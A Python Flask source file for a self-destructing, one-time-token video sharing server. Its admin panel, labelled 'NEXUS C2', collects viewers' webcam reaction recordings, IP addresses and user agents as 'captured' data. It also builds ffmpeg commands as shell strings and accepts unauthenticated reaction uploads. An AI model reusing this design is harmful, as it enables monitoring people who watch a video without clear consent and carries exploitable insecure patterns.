from flask import Flask, request, render_template, send_file, abort, jsonify, redirect, url_for
import os, sys, uuid, threading, time, sqlite3, subprocess, json
from datetime import datetime

if getattr(sys, 'frozen', False):
    APP_DIR = sys._MEIPASS
    BASE_DIR = os.path.dirname(sys.executable)
else:
    APP_DIR = os.path.dirname(os.path.abspath(__file__))
    BASE_DIR = APP_DIR

DATA_DIR = os.path.join(BASE_DIR, 'data')
REACT_DIR = os.path.join(DATA_DIR, 'reactions')
UPLOADS_DIR = os.path.join(BASE_DIR, 'uploads')

os.makedirs(REACT_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, 'wikmaz_ghost.db')
URL_FILE = os.path.join(DATA_DIR, 'public_url.txt')

active_sessions = {}

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS videos (id TEXT PRIMARY KEY, filename TEXT, status TEXT, auto_delete INTEGER, profile TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS tokens (token TEXT PRIMARY KEY, video_id TEXT, used INTEGER, require_camera INTEGER)''')
    c.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT, ip TEXT, user_agent TEXT, timestamp TEXT, reaction_file TEXT)''')
    conn.commit()
    conn.close()

init_db()

def query_db(query, args=(), one=False):
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    cur = conn.cursor()
    cur.execute(query, args)
    rv = cur.fetchall()
    conn.commit()
    conn.close()
    return (rv[0] if rv else None) if one else rv

def optimize_video(input_path, output_path, profile):
    if profile == "source":
        os.rename(input_path, output_path)
        return
    cmd = f'ffmpeg -y -i "{input_path}" -vf "scale=-2:480" -c:v libx264 -preset fast -b:v 600k -maxrate 600k -bufsize 1200k -r 24 -c:a aac -b:a 96k -movflags +faststart "{output_path}"' if profile == "mobile" else f'ffmpeg -y -i "{input_path}" -vf "scale=-2:720" -c:v libx264 -preset fast -b:v 1500k -maxrate 1500k -bufsize 3000k -r 30 -c:a aac -b:a 128k -movflags +faststart "{output_path}"'
    try:
        subprocess.run(cmd, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.remove(input_path)
    except:
        os.rename(input_path, output_path)

# === BRAMKA ===
app_public = Flask('public', template_folder=os.path.join(APP_DIR, 'templates_public'))

@app_public.route('/')
def index(): return render_template('login.html', auto_token=request.args.get('t', ''))

@app_public.route('/auth', methods=['POST'])
def auth():
    token = request.form.get('token')
    td = query_db("SELECT * FROM tokens WHERE token=?", (token,), one=True)
    if not td or td['used'] == 1:
        time.sleep(3)
        return "💀 Błąd / Error.", 403
    query_db("UPDATE tokens SET used=1 WHERE token=?", (token,))
    stream_id = str(uuid.uuid4())
    active_sessions[stream_id] = {'video_id': td['video_id'], 'token': token, 'req_cam': td['require_camera']}
    return render_template('player.html', stream_id=stream_id, token=token, req_cam=td['require_camera'])

@app_public.route('/stream/<stream_id>')
def stream(stream_id):
    if stream_id not in active_sessions: return abort(403)
    vid_data = query_db("SELECT * FROM videos WHERE id=?", (active_sessions[stream_id]['video_id'],), one=True)
    return send_file(os.path.join(UPLOADS_DIR, vid_data['filename']), mimetype='video/mp4', conditional=True)

@app_public.route('/destroy_session/<stream_id>', methods=['POST'])
def destroy_session(stream_id):
    if stream_id in active_sessions:
        vid_id = active_sessions[stream_id]['video_id']
        del active_sessions[stream_id]
        if query_db("SELECT count(*) as c FROM tokens WHERE video_id=? AND used=0", (vid_id,), one=True)['c'] == 0:
            v_data = query_db("SELECT * FROM videos WHERE id=?", (vid_id,), one=True)
            filepath = os.path.join(UPLOADS_DIR, v_data['filename'])
            if v_data['auto_delete'] == 1 and os.path.exists(filepath):
                os.remove(filepath)
                query_db("UPDATE videos SET status='Zniszczony (Auto)' WHERE id=?", (vid_id,))
    return "OK"

@app_public.route('/upload_reaction/<token>', methods=['POST'])
def upload_reaction(token):
    r_file = f"reaction_{token}.webm"
    with open(os.path.join(REACT_DIR, r_file), 'ab') as f: f.write(request.data)
    if not query_db("SELECT * FROM stats WHERE token=?", (token,), one=True):
        query_db("INSERT INTO stats (token, ip, user_agent, timestamp, reaction_file) VALUES (?, ?, ?, ?, ?)", 
                 (token, request.remote_addr, request.headers.get('User-Agent', ''), datetime.now().strftime("%Y-%m-%d %H:%M:%S"), r_file))
    return "OK"

# === NEXUS C2 ===
app_nexus = Flask('nexus', template_folder=os.path.join(APP_DIR, 'templates_nexus'))

@app_nexus.route('/', methods=['GET', 'POST'])
def nexus():
    if request.method == 'POST':
        file = request.files['video']
        t_count = int(request.form.get('token_count', 1))
        auto_del = 1 if request.form.get('auto_delete') else 0
        req_cam = 1 if request.form.get('require_camera') else 0
        quality = request.form.get('quality', 'source')
        
        video_id = str(uuid.uuid4())
        raw_path = os.path.join(UPLOADS_DIR, f"raw_{video_id}.mp4")
        final_path = os.path.join(UPLOADS_DIR, f"{video_id}.mp4")
        
        file.save(raw_path)
        optimize_video(raw_path, final_path, quality)
        
        query_db("INSERT INTO videos (id, filename, status, auto_delete, profile) VALUES (?, ?, ?, ?, ?)", (video_id, f"{video_id}.mp4", 'Aktywny', auto_del, quality))
        for _ in range(t_count):
            query_db("INSERT INTO tokens (token, video_id, used, require_camera) VALUES (?, ?, 0, ?)", (str(uuid.uuid4()).split('-')[0], video_id, req_cam))
        return redirect(url_for('nexus'))
        
    u = open(URL_FILE).read().strip() if os.path.exists(URL_FILE) else "Brak"
    return render_template('nexus.html', stats=query_db("SELECT * FROM stats ORDER BY id DESC"), tokens=query_db("SELECT * FROM tokens"), videos=query_db("SELECT * FROM videos"), public_url=u)

@app_nexus.route('/kill/<video_id>', methods=['POST'])
def kill_video(video_id):
    v = query_db("SELECT * FROM videos WHERE id=?", (video_id,), one=True)
    if v:
        filepath = os.path.join(UPLOADS_DIR, v['filename'])
        if os.path.exists(filepath): os.remove(filepath)
    query_db("UPDATE videos SET status='Zniszczony (Ręcznie)' WHERE id=?", (video_id,))
    return redirect(url_for('nexus'))

@app_nexus.route('/play_reaction/<filename>')
def play_reaction(filename): return send_file(os.path.join(REACT_DIR, filename), mimetype='video/webm')

@app_nexus.route('/export_data')
def export_data():
    stats = [dict(row) for row in query_db("SELECT * FROM stats")]
    tokens = [dict(row) for row in query_db("SELECT * FROM tokens")]
    return jsonify({"export_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "captured_stats": stats, "generated_tokens": tokens})

def run_servers():
    import logging
    logging.getLogger('werkzeug').setLevel(logging.ERROR)
    threading.Thread(target=lambda: app_public.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
    threading.Thread(target=lambda: app_nexus.run(host='127.0.0.1', port=5001, use_reloader=False)).start()
